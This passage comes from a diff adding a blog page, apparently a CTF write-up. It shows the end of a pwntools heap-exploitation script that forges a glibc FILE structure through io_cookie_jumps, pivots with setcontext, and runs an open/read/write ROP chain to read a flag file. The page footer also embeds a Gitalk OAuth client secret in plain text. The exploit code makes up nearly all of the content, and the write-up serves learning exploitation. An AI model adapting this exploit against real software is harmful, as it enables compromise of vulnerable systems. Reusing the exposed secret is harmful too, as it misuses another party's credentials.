+fake_file+=p64(0)                    #_IO_buf_end 
+fake_file+=p64(0)                       #_IO_save_base
+fake_file+=p64(0)                       #_IO_backup_base 
+fake_file+=p64(0)                       #_IO_save_end
+fake_file+=p16(0) *4                       #_markers
+fake_file+=p16(0) *4                       #chain   could be a anathor file struct
+fake_file+=p32(0)                       #_fileno
+fake_file+=p32(0)                       #_flags2
+fake_file+=p64(0)      #_old_offset
+fake_file+=p16(0)                       #_cur_column
+fake_file+=p8(0)                        #_vtable_offset
+fake_file+=p8(0)                      #_shortbuf
+fake_file+=p32(0)
+fake_file+=p64(libc_base + 0x1F5720)                    #_lock   _IO_flockfile (fp);
+fake_file+=p64(0)      #_offset
+fake_file+=p64(0)                       #_codecvt
+fake_file+=p64(0)                    #_wide_data
+fake_file+=p64(0)                       #_freeres_list
+fake_file+=p64(0)                       #_freeres_buf
+fake_file+=p64(0)                       #__pad5
+fake_file+=p32(0)              #_mode
+fake_file+=p32(0)                       #unused2
+fake_file+=p64(0)*2                     #unused2
+fake_file+=p64(io_cookie_jumps + 0x40)                       #
+#0xe0
+fake_file += p64(heap_base + 0x22a0 + 0x100) # rdi in gadget
+fake_file += p64(0)
+fake_file += p64(R) + p64(0)
+# 0x100
+fake_file += p64(0)
+fake_file += p64(heap_base + 0x22a0 + 0x100) #rdx
+
+fake_file += p64(0)*2
+fake_file += p64(libc_base + libc.symbols[&#39;setcontext&#39;] + 61)
+fake_file += str(frame)[0x28:]
+
+fake_file += p64(0) * 2 + &#39;./flag\x00\x00&#39; + p64(0)
+
+log.info(hex(len(fake_file)))
+
+rop = p64(rdi_ret) + p64(flag_addr) + p64(rsi_ret) + p64(0) + p64(rax_ret) + p64(constants.SYS_open) + p64(syscall_ret)
+rop += p64(rdi_ret) + p64(3) + p64(rsi_ret) + p64(buf_addr) + p64(rdx_r12_ret) + p64(0x40) + p64(0) + p64(libc_base + libc.symbols[&#39;read&#39;])
+rop += p64(rdi_ret) + p64(1) + p64(rsi_ret) + p64(buf_addr) + p64(rdx_r12_ret) + p64(0x40) + p64(0) + p64(libc_base +libc.symbols[&#39;write&#39;])
+fake_file += rop
+
+payload = add(0,0x440)
+payload += add(2,0x430)
+payload += delete(0)
+payload += add(4,0x500)
+payload += delete(2)
+payload += edit(0,large_payload+p64(TLS + 0x30 - 0x20))
+payload += add(4,0x500)
+payload += add(2,0x430)
+payload += delete(2)
+payload += edit(0,large_payload+p64(libc_base + libc.symbols[&#39;stderr&#39;] - 0x20))
+payload += add(4,0x500)
+payload += add(2,0x430)
+payload += delete(2)
+payload += edit(0,large_payload+p64(topchunk - 0x20) + fake_file[0x30:])
+payload += add(4,0x500)
+
+payload += &#39;\x05&#39;
+gdb.attach(sh,&#39;b * $rebase(0x1495)&#39;)
+
+sh.sendline(payload)
+
+
+# payload += edit(0,0x)
+
+
+sh.interactive()
+
+</code></pre>
+
+  </article>
+  
+    
+
+  
+  <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '80b2453b6d5f37ad6225',
+        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
+        id: window.location.pathname,
+        repo: 'nexmoe.github.io',
+        owner: 'nexmoe',
+        admin: 'nexmoe'
+    })
+    gitalk.render('gitalk')
+</script>
+</section>
+</div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+ 
+    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+ 
+    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script src="/js/app.js?v=1637381239034"></script>
+<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
+
+
+
+
+  
+
+
+
+
+
+</body>
+
+</html>
